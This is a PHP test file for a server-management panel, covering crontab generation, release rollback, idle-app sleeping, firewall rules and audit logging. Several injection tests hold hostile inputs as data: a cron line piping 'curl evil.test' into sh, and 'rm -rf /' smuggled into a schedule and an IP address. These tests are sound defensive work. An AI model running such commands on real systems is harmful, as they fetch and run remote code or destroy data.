<?php

declare(strict_types=1);

use App\Enums\ApplicationType;
use App\Enums\DeploymentStatus;
use App\Enums\PowerState;
use App\Enums\ServerStatus;
use App\Exceptions\NoPreviousReleaseException;
use App\Exceptions\UnsafeNameException;
use App\Jobs\IdleAppSleeper;
use App\Jobs\ManageFirewallRule;
use App\Jobs\RollbackApplication;
use App\Jobs\WakeApplication;
use App\Models\Application;
use App\Models\CloudProvider;
use App\Models\Deployment;
use App\Models\Server;
use App\Services\Cloud\Tasks\CloudTask;
use App\Services\Deployment\CrontabBuilder;
use App\Services\Deployment\DeploymentCommands;
use App\Services\Process\FpmPoolBuilder;
use App\Services\Process\ProcessManager;
use App\Services\Process\SystemdUnitBuilder;
use App\Services\Runtime\AsdfManager;
use App\Services\Server\SecurityHardening;
use App\Services\SSH\SSHConnection;
use App\Services\SSH\SSHConnectionManager;
use Spatie\Activitylog\Models\Activity;
use Tests\Support\FakeSSHTransport;

function cronApp(array $attributes = []): Application
{
    return Application::factory()->create(array_merge([
        'slug' => 'my-app',
        'system_user' => 'coresmith-app-abcd',
        'type' => ApplicationType::Php,
        'php_version' => '8.5.5',
    ], $attributes));
}

function withTransport(FakeSSHTransport $transport, callable $work): void
{
    SSHConnectionManager::createTransportUsing(fn(): FakeSSHTransport => $transport);

    try {
        $work();
    } finally {
        SSHConnectionManager::createTransportUsing(null);
    }
}

function processes(): ProcessManager
{
    $asdf = new AsdfManager;

    return new ProcessManager(new SystemdUnitBuilder($asdf), new FpmPoolBuilder($asdf));
}

test('a crontab points at the current symlink so it follows deployments', function () {
    $app = cronApp(['cron_jobs' => [['schedule' => '* * * * *', 'command' => 'php artisan schedule:run']]]);
    $crontab = app(CrontabBuilder::class)->build($app);
    $scripts = implode("\n", app(CrontabBuilder::class)->scripts($app));

    expect($crontab)->toContain("-p 'WorkingDirectory=/var/coresmith/apps/my-app/current'")
        ->and($scripts)->toContain("\nphp artisan schedule:run\n")
        ->and($crontab . $scripts)->not->toContain('/releases/');
});

test('a crontab carries the resolved runtime path and logs to the scheduler log', function () {
    $app = cronApp(['cron_jobs' => [['schedule' => '* * * * *', 'command' => 'php artisan schedule:run']]]);

    expect(app(CrontabBuilder::class)->build($app))->toContain('PATH=/opt/asdf-data/installs/php/8.5.5/bin')
        ->and(app(CrontabBuilder::class)->scripts($app)['/etc/coresmith/cron/my-app/0.sh'] ?? '')->toStartWith("exec >> '/var/coresmith/apps/my-app/shared/logs/scheduler.log' 2>&1\n");
});

test('a cron command containing a newline stays in its script and cannot add cron entries', function () {
    $app = cronApp(['cron_jobs' => [['schedule' => '* * * * *', 'command' => "ok\n* * * * * root curl evil.test|sh"]]]);
    $crontab = app(CrontabBuilder::class)->build($app);

    expect(substr_count($crontab, "\n"))->toBe(2)
        ->and($crontab)->not->toContain('evil.test')
        ->and(app(CrontabBuilder::class)->scripts($app)['/etc/coresmith/cron/my-app/0.sh'] ?? '')->toBe("exec >> '/var/coresmith/apps/my-app/shared/logs/scheduler.log' 2>&1\n{\nok\n* * * * * root curl evil.test|sh\n} < /dev/null\n");
});

test('a malformed cron schedule is refused', function () {
    $app = cronApp(['cron_jobs' => [['schedule' => '* * * * *; rm -rf /', 'command' => 'true']]]);

    app(CrontabBuilder::class)->build($app);
})->throws(UnsafeNameException::class);

test('rolling back swaps to the previous release', function () {
    $app = cronApp();
    Deployment::factory()->for($app)->create(['release' => '1', 'status' => DeploymentStatus::Succeeded]);
    $transport = (new FakeSSHTransport)->respondTo('ls -1dt', "/var/coresmith/apps/my-app/releases/2/\n/var/coresmith/apps/my-app/releases/1/\n", 0);

    withTransport($transport, function () use ($app): void {
        (new RollbackApplication($app))->handle(app(SSHConnectionManager::class), new DeploymentCommands(new AsdfManager));
    });

    $commands = implode("\n", $transport->commands());

    expect($commands)->toContain('ln -sfn /var/coresmith/apps/my-app/releases/1 /var/coresmith/apps/my-app/current.tmp')
        ->and($commands)->toContain('mv -Tf');
});

test('rolling back with only one release refuses rather than breaking the symlink', function () {
    $app = cronApp();
    $transport = (new FakeSSHTransport)->respondTo('ls -1dt', "/var/coresmith/apps/my-app/releases/1/\n", 0);

    withTransport($transport, function () use ($app): void {
        (new RollbackApplication($app))->handle(app(SSHConnectionManager::class), new DeploymentCommands(new AsdfManager));
    });
})->throws(NoPreviousReleaseException::class);

test('an app idle past its timeout is put to sleep', function () {
    $app = cronApp([
        'power_state' => PowerState::Active,
        'idle_timeout_minutes' => 30,
        'last_request_at' => now()->subMinutes(45),
    ]);

    withTransport(new FakeSSHTransport, function (): void {
        (new IdleAppSleeper)->handle(app(SSHConnectionManager::class), processes());
    });

    expect($app->fresh()->power_state)->toBe(PowerState::Sleeping);
});

test('an idle app on a server that is moving between panels is left alone', function () {
    $app = cronApp([
        'power_state' => PowerState::Active,
        'idle_timeout_minutes' => 30,
        'last_request_at' => now()->subMinutes(45),
    ]);
    $app->server->forceFill(['status' => ServerStatus::Moving])->save();
    $transport = new FakeSSHTransport;

    withTransport($transport, function (): void {
        (new IdleAppSleeper)->handle(app(SSHConnectionManager::class), processes());
    });

    expect($app->fresh()->power_state)->toBe(PowerState::Active)
        ->and($transport->connected())->toBeFalse();
});

test('an app inside its idle window keeps running', function () {
    $app = cronApp([
        'power_state' => PowerState::Active,
        'idle_timeout_minutes' => 30,
        'last_request_at' => now()->subMinutes(5),
    ]);

    withTransport(new FakeSSHTransport, function (): void {
        (new IdleAppSleeper)->handle(app(SSHConnectionManager::class), processes());
    });

    expect($app->fresh()->power_state)->toBe(PowerState::Active);
});

test('an app with sleeping disabled never sleeps', function () {
    $app = cronApp([
        'power_state' => PowerState::Active,
        'idle_timeout_minutes' => 0,
        'last_request_at' => now()->subDays(30),
    ]);

    withTransport(new FakeSSHTransport, function (): void {
        (new IdleAppSleeper)->handle(app(SSHConnectionManager::class), processes());
    });

    expect($app->fresh()->power_state)->toBe(PowerState::Active);
});

test('waking a sleeping app starts it', function () {
    $app = cronApp(['power_state' => PowerState::Sleeping]);

    withTransport(new FakeSSHTransport, function () use ($app): void {
        (new WakeApplication($app))->handle(app(SSHConnectionManager::class), processes());
    });

    expect($app->fresh()->power_state)->toBe(PowerState::Active);
});

test('waking a stopped app does nothing, since stopping was deliberate', function () {
    $app = cronApp(['power_state' => PowerState::Stopped]);
    $transport = new FakeSSHTransport;

    withTransport($transport, function () use ($app): void {
        (new WakeApplication($app))->handle(app(SSHConnectionManager::class), processes());
    });

    expect($app->fresh()->power_state)->toBe(PowerState::Stopped)
        ->and($transport->commands())->toBe([]);
});

test('a user firewall rule is applied and logged', function () {
    $server = Server::factory()->create(['host_key_fingerprint' => null, 'os_name' => 'ubuntu']);
    $transport = new FakeSSHTransport;

    withTransport($transport, function () use ($server): void {
        (new ManageFirewallRule($server, 'allow', 6379, '203.0.113.5'))->handle(app(SSHConnectionManager::class));
    });

    expect(implode("\n", $transport->commands()))->toContain('ufw allow from 203.0.113.5 to any port 6379')
        ->and(Activity::where('description', 'firewall_rule_changed')->count())->toBe(1);
});

test('a firewall rule with a bad address never reaches the server', function () {
    $server = Server::factory()->create(['host_key_fingerprint' => null, 'os_name' => 'ubuntu']);
    $transport = new FakeSSHTransport;

    withTransport($transport, function () use ($server): void {
        (new ManageFirewallRule($server, 'allow', 6379, '1.2.3.4; rm -rf /'))->handle(app(SSHConnectionManager::class));
    });
})->throws(InvalidArgumentException::class);

test('auditd is installed only when the server opts in', function () {
    $server = Server::factory()->create(['host_key_fingerprint' => null, 'os_name' => 'ubuntu', 'audit_logging_enabled' => true]);
    $transport = new FakeSSHTransport;
    $connection = (new SSHConnection($server, $transport))->connect();

    (new SecurityHardening)->harden($connection);

    expect(implode("\n", $transport->commands()))->toContain('auditctl')
        ->and($transport->uploads())->toHaveKey('/etc/audit/rules.d/coresmith.rules');
});

test('auditd is skipped when the server has not opted in', function () {
    $server = Server::factory()->create(['host_key_fingerprint' => null, 'os_name' => 'ubuntu', 'audit_logging_enabled' => false]);
    $transport = new FakeSSHTransport;
    $connection = (new SSHConnection($server, $transport))->connect();

    (new SecurityHardening)->harden($connection);

    expect($transport->uploads())->not->toHaveKey('/etc/audit/rules.d/coresmith.rules');
});

test('the cron files and the scripts they run are audited alongside the crontabs', function (string $rule) {
    expect((new SecurityHardening)->auditRules())->toContain("\n{$rule}\n");
})->with([
    '-w /etc/crontab -p wa -k crontab',
    '-w /etc/cron.d/ -p wa -k crontab',
    '-w /etc/coresmith/cron/ -p wa -k crontab',
    '-w /var/spool/cron/ -p wa -k crontab',
]);

test('the audit rules watch every sensitive path from the spec', function (string $path) {
    expect((new SecurityHardening)->auditRules())->toContain($path);
})->with(['/etc/sudoers', '/etc/ssh/sshd_config', '/etc/shadow', '/etc/coresmith/', '/etc/crontab']);

test('idle apps on a server being resized are left alone', function () {
    $app = cronApp(['idle_timeout_minutes' => 15, 'last_request_at' => now()->subMinutes(20), 'power_state' => PowerState::Active]);
    $other = cronApp(['slug' => 'other-app', 'system_user' => 'coresmith-app-efgh', 'idle_timeout_minutes' => 15, 'last_request_at' => now()->subMinutes(20), 'power_state' => PowerState::Active]);
    $server = $app->server;
    $server->forceFill(['cloud_provider_id' => CloudProvider::factory()->for($server->team)->create()->getKey(), 'provider_server_id' => '4711'])->save();
    CloudTask::start($server, CloudTask::RESIZE, 'wait_off', ['from' => 'cx22', 'to' => 'cx32', 'power_cycle' => true]);
    $transport = new FakeSSHTransport;

    withTransport($transport, function (): void {
        (new IdleAppSleeper)->handle(app(SSHConnectionManager::class), processes());
    });

    expect($app->fresh()->power_state)->toBe(PowerState::Active)
        ->and($other->fresh()->power_state)->toBe(PowerState::Sleeping)
        ->and(collect($transport->commands())->filter(fn(string $command): bool => str_contains($command, 'coresmith-app-my-app'))->all())->toBe([]);
});
